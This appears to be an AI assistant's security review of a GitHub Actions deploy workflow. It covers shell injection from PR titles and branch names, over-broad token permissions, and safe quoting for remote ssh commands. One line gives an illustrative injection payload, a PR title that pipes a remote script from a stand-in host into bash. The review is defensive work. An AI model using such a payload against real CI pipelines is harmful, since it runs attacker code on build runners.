I couldn't find the deploy script in this workspace. No file in the repo mentions `ssh`. The only deploy-related files are `.github/workflows/deploy.yml` and `k8s/deployment.yml`, and neither one builds an ssh command. Is the script on another branch, not committed yet, or in another repo? Send me the path or paste it and I'll review it.

`.github/workflows/deploy.yml` is the file CI would run, though, and it has two serious problems you should fix before handing anything to CI:

1. **Shell injection from the PR title (`deploy.yml:14`).**
   ```yaml
   - run: echo "Title is ${{ github.event.pull_request.title }}"
   ```
   GitHub fills in `${{ … }}` before the shell runs, so whoever opens the PR controls part of the script. A title like `"; curl evil.sh | bash; echo "` runs on the runner. It's the same kind of bug you described with the branch name. Branch names (`github.head_ref`) can be attacked the same way. Fix: pass the value in through an environment variable and quote it:
   ```yaml
   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: printf 'Title is %s\n' "$PR_TITLE"
   ```

2. **`permissions: write-all` on a `pull_request` trigger (`deploy.yml:7`).** Any step that gets compromised, including through the injection above, gets a token that can write to the repo. Grant only what the job needs, such as `contents: read`, and give write access only to the specific jobs that need it. A deploy job also shouldn't run on unreviewed PRs. Run it on `push` to the main branch or behind an environment with required reviewers.

**What to look for in the ssh script itself:** `ssh host "deploy $BRANCH"` is unsafe even with the quotes. ssh joins its arguments into one string, and the shell on the remote host parses that string again, so local quoting doesn't protect you. The safe approach:
- Check the branch name against an allowlist at the start and reject anything that fails, for example `[[ $BRANCH =~ ^[A-Za-z0-9._/-]+$ && $BRANCH != -* ]] || exit 2`.
- Escape for the remote shell when you build the command: `ssh -- "$host" "deploy-app $(printf '%q' "$BRANCH")"`. Better still, pass the branch on stdin, or use a fixed remote command (a `command=` entry in authorized_keys that reads `SSH_ORIGINAL_COMMAND` and validates it).
- Never use `eval` or `bash -c "...$BRANCH..."` on either end.

Once I have the actual script, I'll go through it fully and run `shellcheck` and `bash -n` on it.
